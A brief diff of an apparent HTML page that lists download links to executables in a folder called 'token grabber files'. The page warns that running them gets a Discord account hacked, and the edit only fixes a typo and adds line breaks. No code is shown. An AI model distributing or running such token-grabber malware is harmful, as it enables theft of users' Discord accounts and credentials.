@@ -7,7 +7,9 @@ if someone run these files, they're discord will be hacked
 <a href="token%20grabber%20files/PTCG0.2.exe">PTCG0.2</a>
 <br/>
    |
-sklipped
+<br/>
+skipped
+<br/>
    |
 <br/>
 <a href="token%20grabber%20files/PTCG0.6.exe">PTCG0.6</a>
